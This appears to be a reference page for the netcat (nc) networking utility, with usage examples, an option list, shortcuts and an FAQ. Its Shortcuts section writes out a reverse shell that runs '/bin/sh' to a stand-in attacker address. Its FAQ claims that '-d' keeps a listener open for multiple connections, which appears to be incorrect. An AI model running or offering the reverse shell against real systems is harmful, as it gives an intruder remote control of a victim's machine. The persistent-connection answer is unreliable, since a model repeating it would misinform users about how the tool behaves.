# `nc` (Netcat) #

- **Purpose:** The `nc` (netcat) command is a versatile networking utility that reads and writes data across network connections using TCP or UDP protocols. It's often called the "Swiss Army knife" of networking tools, capable of creating various types of network connections, port scanning, file transfers, and serving as a simple proxy or backdoor. Netcat is valuable for debugging, investigation, and testing network connections.
- **Usage:** `nc [OPTIONS] HOST PORT`

## Basic Usage ##

Connect to a host on a specific port:

```bash
nc google.com 80

```text

Listen on a specific port:

```bash
nc -l 8080

```text

Send a data stream to a port:

```bash
echo "Hello World" | nc google.com 80

```text

Scan for open ports on a target host:

```bash
nc -zv 192.168.1.1 80-100

```text

Transfer files between systems:

```bash
# On the receiver side: #
nc -l 9999 > received_file.txt

# On the sender side: #
cat file.txt | nc target_host 9999

```text

Create a simple chat session:

```bash
# On server side: #
nc -l 1234

# On client side: #
nc server_ip 1234

```text

## Options ##

- `-l` — Listen mode, for inbound connections
- `-p` — Specify local port for connections
- `-u` — Use UDP instead of default TCP
- `-v` — Verbose output
- `-w` — Set timeout for connections (in seconds)
- `-z` — Zero-I/O mode (scan for listening daemons)
- `-n` — Numeric-only IP addresses, no DNS lookups
- `-g` — Specify source routing hop points
- `-G` — Set source routing pointer
- `-s` — Set source IP address for connections

## Shortcuts ##

Common netcat operations:

```bash
# Simple port scanner #
nc -zv 192.168.1.1 1-1000

# Banner grabbing from a service #
nc -v 192.168.1.1 22

# Transfer a directory using tar #
tar -cf - directory/ | nc -l 8080

# Receive the directory #
nc target_ip 8080 | tar -xf -

# Simple web server (one request) #
while true; do
  echo -e "HTTP/1.1 200 OK\r\n\r\n$(date)" | nc -l -p 8080
done

# Create a reverse shell (use carefully) #
# Victim: nc -e /bin/sh attacker_ip port #
# Attacker: nc -l -p port #

# UDP scan #
nc -nzuv target.com 53

```text

## FAQ ##

### What Is Netcat Commonly Used For? ###

Netcat is used for:

- Port scanning and service enumeration
- File transfers between systems
- Network debugging and testing
- Creating simple backdoors or proxies
- Banner grabbing to identify services

### How Do I Perform Port Scanning With Netcat? ###

Use the `-z` option to scan without sending data:

```bash
nc -zv target.com 1-1000  # Scan ports 1-1000
nc -z target.com 80 443   # Scan specific ports

```text

### What's the Difference Between Netcat and Telnet? ###

- `netcat` - More versatile, supports UDP, port scanning, file transfers, and scripting
- `telnet` - Primarily for connecting to telnet services, less secure, being phased out

### How Do I Establish a Persistent Connection? ###

Use the `-d` flag to remain daemonized and reusable:

```bash
nc -dl 8080  # Listen and remain open for multiple connections

```text

### Is Netcat Secure to Use? ###

Netcat transmits data in plaintext, so it's not secure for sensitive data. For secure connections, consider using alternatives like:

- `socat` - More secure with SSL support
- SSH tunneling for encrypted transfers
- Encrypted protocols like HTTPS/FTPS instead of raw connections
